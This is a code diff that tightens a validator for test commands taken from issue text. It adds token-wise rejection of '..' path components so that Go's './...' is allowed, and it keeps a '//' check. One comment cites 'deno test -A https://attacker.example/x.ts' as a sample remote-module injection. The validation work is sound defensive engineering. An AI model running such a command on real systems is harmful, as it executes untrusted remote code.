@@ -619,6 +619,15 @@ const OPTIN_TEST_RUNNER_SUBCOMMANDS = {
 // 単一コマンドの引数列に限定する）。
 const OPTIN_TEST_COMMAND_RE = /^[A-Za-z0-9][A-Za-z0-9 _./:=@+,-]{0,199}$/
 
+// パストラバーサル対策（`..` 拒否）の判定はトークン単位・パス区切り単位で行う。単純な
+// `s.includes('..')` は `go test ./...`（Go の全パッケージ再帰指定という正規イディオム）の
+// ような `...` を含む正当な値まで拒否してしまう。スペース区切りのトークンごとに `/` で
+// パス成分へ分割し、成分が厳密に `..`（親ディレクトリ参照）と一致する場合のみ拒否する
+// （`...` は '.', '.', '.' の 3 文字連続でも成分としては `..` と一致しない）。
+function hasParentPathTraversal(s) {
+  return s.split(' ').some((tok) => tok.split('/').includes('..'))
+}
+
 // args.externalChecks のパーサ（parseExternalChecks）と同じ形の決定的パーサ。イシュー本文
 // 由来の宣言値（Tree フェーズが抽出した生値）を受け取り、許可形式に合致するもののみ
 // commands へ、それ以外は invalid へ振り分ける（fail-closed。ホストが検証済みコマンドのみを
@@ -644,7 +653,7 @@ function parseOptinTestDeclarations(raw) {
     // '//' 拒否は URL 形式の引数（例: `deno test -A https://attacker.example/x.ts`）の混入を防ぐ。
     // deno は第 2 トークンを 'test'/'task' に制限しているだけでリモートモジュール URL の実行自体は
     // 拒否していないため、値そのものに URL を書けないようにする境界をここへ追加する（A03）。
-    if (!OPTIN_TEST_COMMAND_RE.test(s) || s.includes('..') || s.includes('//')) {
+    if (!OPTIN_TEST_COMMAND_RE.test(s) || hasParentPathTraversal(s) || s.includes('//')) {
       invalid.push(capText(sanitize(v), 300))
       continue
     }
